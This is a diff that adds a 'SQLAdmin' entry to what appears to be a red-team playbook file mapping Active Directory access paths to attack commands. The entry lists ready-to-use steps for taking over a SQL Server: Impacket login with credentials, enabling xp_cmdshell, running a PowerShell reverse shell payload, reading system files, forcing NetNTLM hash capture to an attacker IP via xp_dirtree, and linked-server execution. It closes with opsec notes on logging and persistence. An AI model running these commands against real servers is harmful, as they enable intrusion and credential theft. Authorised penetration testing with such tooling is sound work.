@@ -113,3 +113,43 @@ HasSession:
       - "Sessions indicate where user credentials may be cached"
       - "Credential dumping requires local admin"
       - "LSASS protection may block credential dumping"
+
+SQLAdmin:
+  Computer:
+    description: "SQL Server admin access - execute commands via xp_cmdshell"
+    commands:
+      - name: "Connect to SQL Server"
+        tool: Impacket
+        command: |
+          mssqlclient.py '<DOMAIN>/<USERNAME>:<PASSWORD>'@<TARGET>
+      - name: "Enable xp_cmdshell"
+        tool: mssqlclient
+        command: |
+          SQL> enable_xp_cmdshell
+      - name: "Execute command"
+        tool: mssqlclient
+        command: |
+          SQL> xp_cmdshell whoami
+      - name: "Execute reverse shell"
+        tool: mssqlclient
+        command: |
+          SQL> xp_cmdshell powershell -enc <BASE64_PAYLOAD>
+      - name: "Read files via OPENROWSET"
+        tool: SQL
+        command: |
+          SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents
+      - name: "Capture NetNTLM hash"
+        tool: SQL
+        command: |
+          EXEC master.dbo.xp_dirtree '\\<ATTACKER_IP>\share', 1, 1
+      - name: "Alternative - use linked servers"
+        tool: SQL
+        command: |
+          SELECT * FROM OPENQUERY("<LINKED_SERVER>", 'select @@servername')
+          -- Or execute on linked server:
+          EXEC ('xp_cmdshell ''whoami''') AT [<LINKED_SERVER>]
+    opsec:
+      - "xp_cmdshell commands logged in SQL Server logs"
+      - "CLR assembly execution as alternative to xp_cmdshell"
+      - "SQL Server service account determines execution context"
+      - "Check for SQL Server Agent jobs for persistence"
